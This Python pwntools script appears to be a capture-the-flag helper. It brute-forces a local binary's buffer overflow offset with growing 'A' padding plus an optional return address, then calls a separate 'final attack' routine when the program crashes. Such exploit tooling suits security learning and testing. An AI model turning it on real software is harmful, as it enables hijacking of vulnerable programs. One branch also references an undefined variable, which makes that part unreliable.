from pwn import *
from termcolor import colored, cprint

from SendOffset import launch # local files
from InputMenu import menu 

# ***------------------------------***
#  This script is used to test the 
#  length of buffer by repeatedly
#  sending payloads of increasing
#  length. A user can also add any
#  data to the end of the payload.
#  This is useful for ROP as well.
# ***------------------------------***

def brute_force():
	executable, function_suffix, suffix, max_length, expected_response = menu()

	NO_SUFFIX = True if suffix.upper() =="N" else False
	suffix = suffix if NO_SUFFIX else int( suffix, 16 )  # convert from string to hex value

	NO_FUNCTION_SUFFIX = True if function_suffix.upper() =="N" else False
	if NO_FUNCTION_SUFFIX:
		pass
	else:
		elf = ELF(executable)
		function_suffix = elf.symbols[function_suffix]
		elf.close()
	
	if max_length != 0:
		for i in range(1,max_length):
			try:
				cprint( f"Testing offset", "red", end=" ")
				cprint( i, "red", attrs=["underline"])
				io = process(executable)

				if NO_FUNCTION_SUFFIX:
					payload = b'A'*i if NO_SUFFIX else b'A'*i + p32(suffix)
				else:
					payload = b'A'*i + p32(function_suffix)

				io.sendline(payload)

				response = io.recv()
				try:
					response = response.decode()
				except:
					pass
				#print(response)
				io.close()
				
				if response.find(expected_response) != -1:
					print()
					cprint( response.strip(), "magenta", attrs=["bold"])
					print(f"Flag found at offset {i}!")
					break
			except:
				cprint( "CAUGHT SEGFAULT", "white", attrs=["blink"])
				cprint( "Launching final attack", "white", attrs=["bold"])
				if NO_FUNCTION_SUFFIX:
					launch(executable, suffix, i+4)	
				else:
					launch(executable, function_suffix, i+4)		
				break
	elif max_length == 0:
		io = process(executable)

		if NO_FUNCTION_SUFFIX:
			payload = p32(suffix)
		else:
			payload = p32(function_suffix)

		io.sendline(payload)

		response = io.recv()
		try:
			response = response.decode()
		except:
			pass
		#print(response)
		io.close()
		
		if response.find(expected_response) != -1:
			print()
			cprint( response.strip(), "magenta", attrs=["bold"])
			print(f"Flag found at offset {i}!")
			
